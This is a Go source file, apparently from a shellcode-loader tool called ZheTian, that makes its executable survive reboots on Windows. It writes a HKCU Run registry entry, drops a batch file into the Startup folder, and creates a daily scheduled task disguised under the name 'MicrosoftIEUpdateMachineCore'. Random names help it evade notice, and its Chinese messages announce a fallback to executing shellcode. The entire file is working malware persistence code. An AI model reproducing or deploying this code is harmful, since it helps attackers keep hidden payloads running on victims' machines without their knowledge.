package server

import (
	"bytes"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"os"
	"os/exec"
)

func StartUp() {
	if err := addRegEdit(); err == nil {
		fmt.Println("已在注册表添加启动项")
		return
	}
	if err := addStartMenu(); err == nil {
		fmt.Println("已添加到启动目录")
	}
	if err := schTask(); err == nil {
		fmt.Println("已添创建计划任务，将于每天的23:30执行")
	}
	fmt.Println("启动项添加失败，即将执行shell code")
}

//addRegEdit 添加注册表
func addRegEdit() error {
	//键名
	keyName := "ZheTian"
	//如果key不存在就自动创建
	key, _, err := registry.CreateKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)

	defer key.Close()
	if err != nil {
		return err
	}
	//如果随机生成成功，就使用随机生成的
	if rand, isRand := GetRand(); isRand == nil {
		keyName = rand
	}
	//获取当前程序的位置
	appPath, err := os.Executable()
	//将程序运行地址添加进去，并且设置为自动运行，如："c:\windows\ZheTian.exe" /StartFrom=AutoRun
	if Uri != "" {
		appPath += " -u " + Uri
	}
	if FilePath != "" {
		appPath += " -r " + FilePath
	}
	if Resource != "" {
		appPath += " -s " + Resource
	}
	err = key.SetStringValue(keyName, appPath)

	if err != nil {
		return err
	}
	return err
}

//addStartMenu 添加启动项
func addStartMenu() error {
	var startBat string

	userDir, err := os.UserHomeDir()
	//获取当前程序的位置
	appPath, err := os.Executable()
	startPath := userDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

	if Uri != "" {
		startBat = "@echo off 　　\nstart \"\" \"" + appPath + " -u " + Uri
	}
	if FilePath != "" {
		startBat = "@echo off 　　\nstart \"\" \"" + appPath + " -r " + FilePath
	}
	if Resource != "" {
		startBat = "@echo off 　　\nstart \"\" \"" + appPath + " -s " + Resource
	}
	if rand, isRand := GetRand(); isRand == nil {
		startPath += rand + ".bat"
	} else {
		startPath += "ZheTian.bat"
	}
	f, err := os.Create(startPath)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.Write([]byte(startBat))
	return err
}

var (
	TaskName = "MicrosoftIEUpdateMachineCore"
	taskInfo string
)

func schTask() error {

	//获取当前程序的位置
	appPath, err := os.Executable()

	if rand, isRand := GetRand(); isRand == nil {
		TaskName = rand
	}

	if Uri != "" {
		taskInfo = fmt.Sprintf("schtasks/create /tn \"%s\" /tr \"%s -u %s\"  /sc daily   /st 23:30", TaskName, appPath, Uri)
	}
	if FilePath != "" {
		taskInfo = fmt.Sprintf("schtasks/create /tn \"%s\" /tr \"%s -u %s\"  /sc daily   /st 23:30", TaskName, appPath, FilePath)
	}
	if Resource != "" {
		taskInfo = fmt.Sprintf("schtasks/create /tn \"%s\" /tr  \"%s -u %s\"  /sc daily   /st 23:30", TaskName, appPath, Resource)
	}

	cmd := exec.Command("cmd.exe", "/c", taskInfo)

	var out bytes.Buffer
	var stderr bytes.Buffer

	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err = cmd.Run()

	return err
}
